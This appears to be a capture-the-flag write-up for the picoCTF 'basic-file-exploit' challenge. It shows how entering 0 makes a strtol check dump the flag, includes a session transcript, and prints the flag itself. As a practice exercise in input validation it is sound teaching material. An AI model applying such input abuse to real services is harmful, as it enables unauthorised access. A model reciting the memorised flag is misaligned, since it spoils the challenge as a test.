@@ -1,0 +1,70 @@
+
+                        basic-file-exploit
+                     =====================
+
+problem URL:
+https://play.picoctf.org/practice?originalEvent=70&page=1&search=basic-file-exploit
+
+https://www.youtube.com/watch?v=-iRG9_zFRC4&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=2           
+https://github.com/Minhao-Zhang/CTF/blob/main/CTFs/picoCTF%202022/basic-file-exploit.md
+  
+Problem Statement:
+The program provided allows you to write to a file and read what you 
+wrote from it. Try playing around with it and see if you can break it!
+
+Connect to the program with netcat: 
+                          nc saturn.picoctf.net 54873
+The program's source code with the flag redacted can be downloaded 
+from:
+  https://artifacts.picoctf.net/c/543/program-redacted.c
+
+Hints:
+  1. Try passing in things the program doesn't expect. 
+     Like a string instead of a number.
+ 
+ 
+  
+Solutions :
+    Screen  after runinnig 
+   Hi, welcome to my echo chamber!
+Type '1' to enter a phrase into our database
+Type '2' to echo a phrase in our database
+Type '3' to exit the program
+
+ If we look into the source code, we see that flag is defined as a constant.
+ If we search for other use of the variable flag, we can only find it in 
+ the data_read() function as follows.
+
+if ((entry_number = strtol(entry, NULL, 10)) == 0) {
+    puts(flag);
+    fseek(stdin, 0, SEEK_END);
+    exit(0);
+}
+
+Thus, if we can make the output of strtol to be 0, we will force the 
+program to print the flag.
+
+Hi, welcome to my echo chamber!
+Type '1' to enter a phrase into our database
+Type '2' to echo a phrase in our database
+Type '3' to exit the program
+1
+1
+Please enter your data:
+1
+1
+Please enter the length of your data:
+1
+1
+Your entry number is: 1
+Write successful, would you like to do anything else?
+2
+2
+Please enter the entry number of your data:
+0      <= This data will create an error (there is o index 0)
+0
+
+picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
+
+
+Flag :picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
